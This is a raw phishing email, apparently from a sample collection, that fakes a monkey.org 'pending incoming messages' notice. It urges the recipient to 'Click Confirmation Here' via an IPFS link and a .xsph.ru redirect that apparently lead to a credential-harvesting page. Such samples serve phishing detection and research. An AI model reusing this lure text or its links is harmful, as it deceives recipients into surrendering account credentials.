@@ -1,0 +1,237 @@
+Return-Path: Noreply@emailhost.com
+Delivered-To: jose@monkey.org
+X-FDA: 81947687430.36.03C1774
+Received: from morita-kagaku.co.jp (unknown [195.19.93.25])
+	by imf06.b.hostedemail.com (Postfix) with ESMTP id 32AADC0009
+	for <jose@monkey.org>; Thu, 28 Mar 2024 21:08:52 +0000 (UTC)
+Authentication-Results: imf06.b.hostedemail.com;	dkim=none;	dmarc=none;
+	spf=fail (imf06.b.hostedemail.com: domain of Noreply@emailhost.com does not
+ designate 195.19.93.25 as permitted sender)
+ smtp.mailfrom=Noreply@emailhost.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1711660133;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	 references;
+ bh=Z2DukO3LyezG5ZwtnuqpKtP9wmS0ZcT9fBEBg+PfHVc=;
+	b=NV3qXLdOC8nSvLXcT6uK99+RZCdPiGkFaoIb2RJxM+K2j4JUKTwDlXr/79byTuQbXeJ/CT
+	Pt4j/k3Jjkqbhi8iFzuYT+l0Z2PpkRBgGm0NKFt4nTKOnS0KvzRcLcEZH+8kCAzE8Uai+L
+	bUgC0ofAQM6nniOXasVYoSRbJ8tOpFE=
+ARC-Authentication-Results: i=1;	imf06.b.hostedemail.com;	dkim=none;
+	dmarc=none;	spf=fail (imf06.b.hostedemail.com: domain of
+ Noreply@emailhost.com does not designate 195.19.93.25 as permitted sender)
+ smtp.mailfrom=Noreply@emailhost.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1711660133; a=rsa-sha256;
+	cv=none;
+	b=H2Xv5Xx+NtqcLZLsDYeyik3dBFwS9xc0p7DCHk7/RG+SwzlzWLyxv9Gu30td/qH6X1uQTI
+	yYgrrH7u7qmPtWbWK/ow1WLx3/joU8wd96uDlx7RB+4hXZrAfcQgmqpmdyLQbPI4Vs/pbo
+	3go5Xlsj1w4wCUzqaFTEj4cWva4viWM=
+Received: from emailhost.com (localhost [IPv6:::1])
+	by morita-kagaku.co.jp (Postfix) with ESMTP id 949E410036D6
+	for <jose@monkey.org>; Thu, 28 Mar 2024 22:57:12 +0300 (MSK)
+From: monkey.org    <Noreply@emailhost.com>
+To: jose@monkey.org
+Subject: You have (8) Pending incoming messages
+Date: 28 Mar 2024 12:57:12 -0700
+Message-ID: <20240328125711.13AF188A7F6FA7F0@emailhost.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam04
+X-Rspamd-Queue-Id: 32AADC0009
+X-Stat-Signature: qwd4rkxxhqp4yiwj6y3pzwsdgj87ayrn
+X-Spam-Status: Yes, score=11.70
+X-Rspam-User: 
+X-HE-Tag: 1711660132-399692
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1+3u0/PUUH6aog+i8w8blq0Vvu6Zo0LHrUpL2zIW17kCnR?=
+ =?utf-8?q?xpw+8RlYkaoUkf7BJQX7YJI2fLNMRPM+7nTsAu04GA+99WiPJzDB+SFIvY6JIWGmm?=
+ =?utf-8?q?jW5ETCT9aqjwGUVrREIg3TqKsCHnY9sPJrnZmaBE67kAZWtosSdT2uPgHIi9enR04?=
+ =?utf-8?q?CXHV6UQj7n+VfiWWAfoQ0B0gYiKd33ouH52XEO62jVfODiWJDHQSChENn9ep0+RDV?=
+ =?utf-8?q?0t/PYTj9am840QzWlexUdVRLqVtnndQy4Y1qMsfEoSNZ8edY2es2JmPTGZhfeDqdQ?=
+ =?utf-8?q?jzyV0F/+ic6qi81HCKmG1uhYJnQVuEsNYom1z5myCL3UD64vT7yBwe40wgQU15YiG?=
+ =?utf-8?q?7nNoxl1Ml0mtNbfdu0WaOnWaqA0aK3wzDUsznp7ns92KqSbY0NIvUyrylA=3D=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 86
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.5em;">
+<div class=3D"gmail_attr" style=3D"color: rgb(34, 34, 34); text-transform: =
+none; text-indent: 0px; letter-spacing: normal; font-family: arial, helveti=
+ca, sans-serif; font-size: small; font-style: normal; font-weight: 400; wor=
+d-spacing: 0px; white-space: normal; orphans: 2; widows: 2; font-variant-li=
+gatures: normal; font-variant-caps: normal; text-decoration-style: initial;=
+ text-decoration-color: initial; -webkit-text-stroke-width: 0px; text-decor=
+ation-thickness: initial;" dir=3D"ltr">
+<div><br><br></div>
+<table style=3D"width: 435px; color: rgb(155, 158, 161); line-height: 1.3; =
+font-size: 14px; border-collapse: collapse; table-layout: fixed; max-width:=
+ 100%; border-spacing: 0px;" cellpadding=3D"0">
+<tbody style=3D'font-family: "pingfang sc", "hiragino sans gb", "wenquanyi =
+micro hei", "microsoft yahei", &#24494;&#36719;&#38597;&#40657;, verdana;'>=
+
+<tr>
+<td width=3D"45" style=3D"margin: 0px; padding: 0px 7px 0px 0px; width: 45p=
+x; font-family: roboto, robotodraft, helvetica, arial, sans-serif; box-sizi=
+ng: border-box;"></td>
+<td style=3D"margin: 0px; padding: 0px 0px 0px 7px; font-family: roboto, ro=
+botodraft, helvetica, arial, sans-serif;"></td></tr></tbody></table></div>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: arial, helvetica, sans-serif; font-=
+size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
+-space: normal; orphans: 2; widows: 2; font-variant-ligatures: normal; font=
+-variant-caps: normal; text-decoration-style: initial; text-decoration-colo=
+r: initial; -webkit-text-stroke-width: 0px; text-decoration-thickness: init=
+ial;">
+<div style=3D"text-align: justify;">
+<div style=3D"background-color: rgb(244, 248, 245);">
+<div style=3D"width: 408px; padding-top: 5px; padding-right: 5px; padding-b=
+ottom: 5px; margin-left: 18px; float: left;">
+<div><span style=3D'font-family: wf_segoe-ui_normal, "segoe ui", "segoe wp"=
+, tahoma, arial, sans-serif; font-size: 13px;'>Message generated from&nbsp;=
+<a style=3D"color: rgb(17, 85, 204);" target=3D"_blank">No-reply@</a></span=
+><font face=3D"wf_segoe-ui_normal, Segoe UI, Segoe WP, Tahoma, Arial, sans-=
+serif"><a style=3D"color: rgb(17, 85, 204);" target=3D"_blank"><strong>monk=
+ey.org</strong></a>&nbsp;<wbr>source.</font></div></div>
+<div>
+<div style=3D"width: 5px; height: 30px; background-color: rgb(86, 166, 89);=
+"></div>
+<p></p>
+<table width=3D"548" style=3D"color: black; padding-top: 0px; padding-botto=
+m: 0px; font-size: 15px; border-collapse: collapse; max-width: 548px; borde=
+r-spacing: 0px; font-stretch: inherit;" cellspacing=3D"0" cellpadding=3D"0"=
+>
+<tbody>
+<tr>
+<td style=3D"margin: 0px; padding-right: 0px; padding-bottom: 15px; padding=
+-left: 0px; font-family: roboto, robotodraft, helvetica, arial, sans-serif;=
+ border-spacing: 0px;">
+<table style=3D"padding-top: 0px; padding-bottom: 0px; font-family: inherit=
+; font-weight: 600; border-collapse: collapse; max-width: 548px; border-spa=
+cing: 0px; font-stretch: inherit;">
+<tbody>
+<tr>
+<td style=3D"margin: 0px; width: 181px; font-family: &quot;segoe ui&quot;, =
+frutiger, arial, sans-serif; vertical-align: bottom;"></td>
+<td style=3D"margin: 0px; width: 186px; text-align: center; font-family: &q=
+uot;segoe ui&quot;, frutiger, arial, sans-serif; vertical-align: bottom;"><=
+/td>
+<td style=3D"margin: 0px; width: 181px; text-align: right; font-family: &qu=
+ot;segoe ui&quot;, frutiger, arial, sans-serif; vertical-align: bottom;"></=
+td></tr>
+<tr>
+<td style=3D"margin: 0px; width: 181px; padding-top: 0px; padding-bottom: 0=
+px; font-family: &quot;segoe ui&quot;, frutiger, arial, sans-serif; font-si=
+ze: 14px; font-weight: 400; vertical-align: middle;"><font color=3D"white">=
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; color: black; =
+vertical-align: baseline;">Sender</span></font></td>
+<td style=3D"margin: 0px; width: 186px; text-align: center; padding-top: 0p=
+x; padding-bottom: 0px; font-family: &quot;segoe ui&quot;, frutiger, arial,=
+ sans-serif; font-size: 14px; font-weight: 400; vertical-align: middle;"></=
+td>
+<td style=3D"margin: 0px; width: 181px; text-align: right; padding-top: 0px=
+; padding-bottom: 0px; font-family: &quot;segoe ui&quot;, frutiger, arial, =
+sans-serif; font-size: 14px; font-weight: 400; vertical-align: middle;"><fo=
+nt color=3D"white"><span style=3D"border-width: 0px; margin: 0px; padding: =
+0px; color: rgb(192, 0, 0); vertical-align: baseline;"><b>Action Required</=
+b>
+</span></font></td></tr>
+<tr>
+<td style=3D"margin: 0px; padding: 0px; font-family: roboto, robotodraft, h=
+elvetica, arial, sans-serif;" colspan=3D"3">
+<table style=3D"padding: 0px; border-collapse: collapse; border-spacing: 0p=
+x;" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"margin: 0px; padding: 0px; width: 180px; height: 10px; line-he=
+ight: 10px; font-family: roboto, robotodraft, helvetica, arial, sans-serif;=
+ font-size: 6px;" bgcolor=3D"#cccccc"></td>
+<td style=3D"margin: 0px; padding: 0px; width: 4px; height: 10px; line-heig=
+ht: 10px; font-family: roboto, robotodraft, helvetica, arial, sans-serif; f=
+ont-size: 6px;" bgcolor=3D"white"></td>
+<td style=3D"margin: 0px; padding: 0px; width: 180px; height: 10px; line-he=
+ight: 10px; font-family: roboto, robotodraft, helvetica, arial, sans-serif;=
+ font-size: 6px;" bgcolor=3D"#cccccc"></td>
+<td style=3D"margin: 0px; padding: 0px; width: 4px; height: 10px; line-heig=
+ht: 10px; font-family: roboto, robotodraft, helvetica, arial, sans-serif; f=
+ont-size: 6px;" bgcolor=3D"white"></td>
+<td style=3D"margin: 0px; padding: 0px; width: 180px; height: 10px; line-he=
+ight: 10px; font-family: roboto, robotodraft, helvetica, arial, sans-serif;=
+ font-size: 6px;" bgcolor=3D"#c00000"></td></tr></tbody></table></td></tr>
+<tr>
+<td style=3D"margin: 0px; padding: 0px; width: 181px; line-height: 20px; fo=
+nt-family: &quot;segoe ui&quot;, frutiger, arial, sans-serif; font-size: 14=
+px; font-weight: 400;"></td>
+<td style=3D"margin: 0px; padding: 0px; width: 186px; text-align: center; l=
+ine-height: 20px; font-family: &quot;segoe ui&quot;, frutiger, arial, sans-=
+serif; font-size: 14px; font-weight: 400;"></td>
+<td style=3D"margin: 0px; padding: 0px; width: 181px; text-align: right; li=
+ne-height: 20px; font-family: &quot;segoe ui&quot;, frutiger, arial, sans-s=
+erif; font-size: 14px; font-weight: 400;"><font color=3D"white">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(192=
+, 0, 0); vertical-align: baseline;">Messages pending</span></font></td></tr=
+></tbody></table></td></tr>
+<tr>
+<td style=3D"margin: 0px; width: 528px; padding-top: 0px; padding-right: 10=
+px; padding-left: 10px; font-family: roboto, robotodraft, helvetica, arial,=
+ sans-serif;"><br>
+<table style=3D"padding: 0px; width: 528px; margin-left: 0px; background-co=
+lor: rgb(242, 245, 250);">
+<tbody>
+<tr>
+<td style=3D"margin: 0px; padding: 0px 10px; font-family: &quot;segoe ui&qu=
+ot;, frutiger, arial, sans-serif; font-size: 21px;">
+<div style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(32, =
+31, 30); font-family: inherit; font-size: 15px; vertical-align: baseline; f=
+ont-stretch: inherit;"><b>Message Failure Delivery Notice from&nbsp;<a>monk=
+ey.org</a>&nbsp;.</b></div>
+<div style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(32, =
+31, 30); font-family: inherit; font-size: 15px; vertical-align: baseline; f=
+ont-stretch: inherit;"><strong>User:</strong>&nbsp;<strong><a style=3D"colo=
+r: rgb(17, 85, 204);" target=3D"_blank">jose@monkey.org</a></strong></div>
+<div style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(32, =
+31, 30); font-family: inherit; font-size: 15px; vertical-align: baseline; f=
+ont-stretch: inherit;"></div></td></tr>
+<tr>
+<td style=3D"margin: 0px; padding: 0px 10px 6px; font-family: &quot;segoe u=
+i&quot;, frutiger, arial, sans-serif; font-size: 16px;">You have (8)&nbsp;P=
+ending incoming messages<br><br>Please Fix It Below<br><br>
+<a style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(17, 85=
+, 204); vertical-align: baseline;" href=3D"https://cloudflare-ipfs.com/ipfs=
+/QmeR47h9dRHBYywCHp8K23CruTEH83x1AcuHa51n1Duaox#jose@monkey.org" target=3D"=
+_blank" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://www.a=
+0654207.xsph.ru/xow/Admin/index.php?email%3D%5B%5B-Email-%5D%5D&amp;source=
+=3Dgmail&amp;ust=3D1648883293639000&amp;usg=3DAOvVaw00DGdfPetVNLsIUw4ZNU7P"=
+><b>Click Confirmation Here</b></a>
+&nbsp;&nbsp;To View Incoming Suspended Messages And Retrieve Them.<br></td>=
+</tr>
+<tr>
+<td style=3D"margin: 0px; padding: 0px 10px 6px; font-family: &quot;segoe u=
+i&quot;, frutiger, arial, sans-serif; font-size: 16px;"><br></td></tr></tbo=
+dy></table></td></tr>
+<tr>
+<td style=3D"margin: 0px; padding-top: 10px; padding-bottom: 4px; font-fami=
+ly: &quot;segoe ui&quot;, frutiger, arial, sans-serif; font-size: 14px;"><b=
+r></td></tr></tbody></table><font color=3D"#999999" size=3D"1">
+The information contained in or attached to this communication is intended =
+solely for the use of the individual or entity to whom it is addressed and =
+others authorized to receive it. It may contain confidential or legally pri=
+vileged information. If you are not the intended recipient you are hereby n=
+otified that any disclosure, copying, distribution or taking any action in =
+reliance on the contents of this information is strictly prohibited and may=
+ be unlawful. If you have received this=20
+communication in error, please notify me immediately by responding to this =
+email and then delete it from your system. We are neither liable for the pr=
+oper and complete transmission of the information contained in this communi=
+cation nor for any delay in its receipt.</font></div></div></div></div></bo=
+dy></html>
+
